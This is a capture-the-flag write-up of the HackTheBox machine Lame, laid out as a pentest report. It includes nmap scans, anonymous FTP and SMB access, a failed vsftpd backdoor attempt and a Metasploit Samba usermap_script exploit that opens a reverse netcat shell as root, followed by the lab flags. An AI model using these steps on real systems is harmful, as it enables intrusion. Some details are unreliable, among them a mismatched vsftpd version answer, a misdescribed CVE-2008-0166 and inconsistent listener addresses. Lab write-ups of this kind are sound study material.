![](attachments/Pasted%20image%2020251016184744.png)
# HackTheBox — Lame Notes by R4ndH3x

- [1.1 vsftpd 2.3.4](#11-vsftpd-234)
	- [1.1.1 (High) Backdoor Command Execution](#111-high-backdoor-command-execution)
		- [1.1.1.1 Exploitation](#1111-exploitation)
		- [1.1.1.3 Remediation](#1113-remediation)
		- [1.1.1.4 Reference](#1114-reference)
	- [1.1.2 (Medium) FTP Anonymous Access](#112-medium-ftp-anonymous-access)
		- [1.1.2.1 Evidence](#1121-evidence)
		- [1.1.2.2 Remediation](#1122-remediation)
		- [1.1.2.3 Reference](#1123-reference)
- [1.2 OpenSSH v4.7p1](#12-openssh-v47p1)
	- [1.2.1 (High) Outdated Version Multiple Vulnerabilities](#121-high-outdated-version-multiple-vulnerabilities)
		- [1.1.1.1 Evidence](#1111-evidence)
		- [1.1.1.2 Remediation](#1112-remediation)
		- [1.1.1.3 Reference](#1113-reference)
- [1.3 Samba smbd](#13-samba-smbd)
	- [1.3.1 (Low) Anonymous Access to Shared Resources](#131-low-anonymous-access-to-shared-resources)
		- [1.1.3.1 Evidence](#1131-evidence)
		- [1.1.3.2 Remediation](#1132-remediation)
		- [1.1.3.3 Reference](#1133-reference)
	- [1.1.4 (High) Remote Command Execution](#114-high-remote-command-execution)
		- [1.1.4.1 Exploitation](#1141-exploitation)
		- [1.1.4.2 Evidence](#1142-evidence)
		- [1.1.4.3 Reference](#1143-reference)
		- [1.1.4.4 Flags](#1144-flags)

# 1.  Port Scanning

`nmap -sC -sV -oA nmap/lame -vv -Pn lame.htb`

| Port | Protocol | State | Service     | Reason  | Product    | Version               | Extra Info           |
| ---- | -------- | ----- | ----------- | ------- | ---------- | --------------------- | -------------------- |
| 21   | tcp      | open  | ftp         | syn-ack | vsftpd     | 2.3.4                 |                      |
| 22   | tcp      | open  | ssh         | syn-ack | OpenSSH    | 4.7p1 Debian 8ubuntu1 | protocol 2.0         |
| 139  | tcp      | open  | netbios-ssn | syn-ack | Samba smbd | 3.X - 4.X             | workgroup: WORKGROUP |
| 445  | tcp      | open  | netbios-ssn | syn-ack | Samba smbd | 3.0.20-Debian         | workgroup: WORKGROUP |

> Question; How many of the `nmap` top 1000 TCP ports are open on the remote host?
> Answer: 4

## 1.1 vsftpd 2.3.4

| 21  | tcp | open | ftp | syn-ack | vsftpd | 2.3.4 |
| --- | --- | ---- | --- | ------- | ------ | ----- |

> Question: What version of VSFTPd is running on Lame?
> Answer: v.2.3.5

### 1.1.1 (High) Backdoor Command Execution 

#### 1.1.1.1 Exploitation

```less
┌─[r4ndhex@parrot]─[~/Obsidian/hackthebox/machine/lame]
└──╼ $ sudo msfconsole

[msf](Jobs:0 Agents:0) >> search "vsftpd 2.3.4"

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


[msf](Jobs:0 Agents:0) >> use 0
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> set RHOST lame.htb 

```

> Question: There is a famous backdoor in VSFTPd version 2.3.4, and a Metasploit module to exploit it. Does that exploit work here?
> Answer: No
#### 1.1.1.3 Remediation

- Remove or replace the vsftpd 2.3.4 package with a trusted version obtained from an official and verified operating system repository
- If FTP is not required within the environment, disable the service entirely to reduce the attack surface
- Restrict external and internal network access to FTP services using firewall rules or network access control lists
- Regularly audit and update all installed software to ensure unsupported or tampered packages are not present in the environment
#### 1.1.1.4 Reference

| Name          | Score | Description                                                                                                     | Security Impact                                                                                                                                                                                                           | Affected Domain | External Refernces                            |
| ------------- | ----- | --------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------- | --------------------------------------------- |
| CVE-2011-2523 | 9.8   | vsftpd 2.3.4 downloaded between 20110630 and 20110703 contains a backdoor which opens a shell on port 6200/tcp. | **Remote code execution** (RCE) / full system compromise. An attacker can run arbitrary code on the SSH server process and often escalate to full system control (root) depending on configuration and local protections. | lame.htb:21     | https://www.cvedetails.com/cve/CVE-2011-2523/ |

### 1.1.2 (Medium) FTP Anonymous Access

#### 1.1.2.1 Evidence

```less
┌─[r4ndhex@parrot]─[~]
└──╼ $ ftp 10.129.83.240
Connected to 10.129.83.240.
220 (vsFTPd 2.3.4)
Name (10.129.83.240:r4ndhex): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
> This demonstrates that the server allows login with the username `anonymous` and no password, making it accessible to anyone.
#### 1.1.2.2 Remediation

- Disable anonymous FTP access in the FTP server configuration.
- Use authentication for FTP access (e.g., user/password authentication).  
- Restrict FTP access to specific IPs or networks.
- Consider using more secure protocols such as SFTP or FTPS.
#### 1.1.2.3 Reference

| Name    | Score | Description                                                                 | Security Impact                                                                                                                                                                    | Affected Domain | External Refernces                              |
| ------- | ----- | --------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------- | ----------------------------------------------- |
| CWE-287 |       | Improper Authentication (e.g., allowing anonymous login without a password) | This weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or even execute arbitrary code. | lame.htb:21     | https://cwe.mitre.org/data/definitions/287.html |


## 1.2 OpenSSH v4.7p1

| 22  | tcp | open | ssh | syn-ack | OpenSSH | 4.7p1 Debian 8ubuntu1 | protocol 2.0 |
| --- | --- | ---- | --- | ------- | ------- | --------------------- | ------------ |

### 1.2.1 (High) Outdated Version Multiple Vulnerabilities 

#### 1.1.1.1 Evidence 

The following `nmap` scan confirms the presence of OpenSSH v4.7p1 on the target machine.

```less
┌─[r4ndhex@parrot]─[~]
└──╼ $ nmap -sV -p 22 -Pn  10.129.83.240
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-23 04:32 UTC
Nmap scan report for 10.129.83.240
Host is up (0.091s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.70 seconds
```
>This indicates that the instance is running an **outdated version** of OpenSSH, which is susceptible to multiple vulnerabilities.
#### 1.1.1.2 Remediation

- **Upgrade OpenSSH**: Replace the outdated version with a more recent one from trusted sources, ensuring security patches are applied.
- **Implement Strong Authentication Mechanisms**: Enforce password policies and consider using key-based authentication to enhance security.
- **Limit User Access**: Restrict SSH access to only necessary users and configure SSH to use non-standard ports if feasible.
- **Regular Security Audits**: Conduct regular audits for installed packages and actively monitor for potential vulnerabilities or patches related to OpenSSH.
#### 1.1.1.3 Reference

| Name          | Score | Description                                                                                                    | Security Impact                                                                                                                                                          | Affected Domain | External References                                                                            |
| ------------- | ----- | -------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------- | ---------------------------------------------------------------------------------------------- |
| CVE-2008-0166 | 7.5   | OpenSSH 4.7 allows remote authenticated users to execute arbitrary commands via a crafted SSH channel request. | Successful exploitation can lead to **remote code execution (RCE)**, compromising the security of the SSH server and enabling attackers to perform unauthorized actions. | lame.htb:22     | [https://www.cvedetails.com/cve/CVE-2008-0166/](https://www.cvedetails.com/cve/CVE-2008-0166/) |
| CVE-2009-4128 | 6.8   | Use of weak key generation algorithms in OpenSSH 4.7 allows attackers to recover private keys.                 | Attackers can exploit weak key generation, leading to potential decryption of sensitive data and unauthorized access to secure communications.                           | lame.htb:22     | [https://www.cvedetails.com/cve/CVE-2009-4128/](https://www.cvedetails.com/cve/CVE-2009-4128/) |

## 1.3 Samba smbd

### 1.3.1 (Low) Anonymous Access to Shared Resources

#### 1.1.3.1 Evidence

There is unauthorized anonymous access to the SMB share, allowing file creation and reading, which could lead to sensitive information being stored or exposed.

```less
└──╼ $ smbclient --no-pass //lame.htb/tmp

Anonymous login successful

Try "help" to get a list of possible commands.

smb: \> mask ""
smb: \> recurse
smb: \> prompt
smb: \> mget *

getting file \.X0-lock of size 11 as .X0-lock (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED opening remote file \5606.jsvc_up
getting file \vgauthsvclog.txt.0 of size 1600 as vgauthsvclog.txt.0 (0.2 KiloBytes/sec) (average 0.1 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED listing \vmware-root\*
NT_STATUS_ACCESS_DENIED opening remote file \.X11-unix\X0

smb: \> exit

┌─[r4ndhex@parrot]─[~/Obsidian/hackthebox/machine/lame/smb/tmp]
└──╼ $ ls
vgauthsvclog.txt.0  vmware-root
```
 >This demonstrates that no password access allowed to recursively download and save files from the server to the local machine.
#### 1.1.3.2 Remediation

- Disable anonymous (guest) SMB access.
- Enforce authentication for all SMB connections.
- Apply least privilege on shared folders.
- Restrict SMB service exposure to trusted hosts.

#### 1.1.3.3 Reference

| Name          | Score | Description                                                                  | Security Impact                                                                              | Affected Domain | External References                             |
| ------------- | ----- | ---------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------- | --------------- | ----------------------------------------------- |
| CVE-1999-0519 | 5.0   | Windows or Samba server allows anonymous (guest) access to shared resources. | Could lead to information disclosure or data tampering through unauthenticated SMB sessions. | lame.htb:445    | https://www.cvedetails.com/cve/CVE-1999-0519/\| |
### 1.1.4 (High) Remote Command Execution

#### 1.1.4.1 Exploitation


#### 1.1.4.2 Evidence

Perform a search for vulnerabilities using `seachsploit`

```less
└──╼ $ searchsploit "Samba 3.0.20"
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                               | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                     | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                        | linux_x86/dos/36741.py
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
> This confirms Samba 3.0.20 has vulnerabilities. 


```less
┌─[r4ndhex@parrot]─[~/Obsidian/hackthebox/machine/lame]
└──╼ $ sudo msfconsole

[msf](Jobs:0 Agents:0) >> search "Samba 3.0.20"

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat

[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set RHOST lame.htb
RHOST => lame.htb

[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set LHOST 10.10.14.48
LHOST => 10.10.14.48

[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> exploit
[*] Started reverse TCP handler on 10.10.14.18:4444 
[*] Command shell session 1 opened (10.10.14.18:4444 -> 10.129.83.240:46648) at 2025-10-23 09:04:18 +0000

script /dev/null -c bash
root@lame:/# id 
uid=0(root) gid=0(root)
```
> This confirms samba 3.0.20 on the server is is exploitable and gives access to root shell

#### 1.1.4.3 Reference

> Question: What 2007 CVE allows for remote code execution in this version of Samba via shell metacharacters involving the SamrChangePassword function when the "username map script" option is enabled in smb.conf?
> Answer: CVE-2007-2447

#### 1.1.4.4 Flags

| User  | Directory            | Flag                             |
| ----- | -------------------- | -------------------------------- |
| makis | /home/makis/flag.txt | 405b26c04ed8c200fd94138d10da6009 |
| root  | /home/root/root.txt  | 9aba61bfe8afd9b88f07a86294c8afb0 |
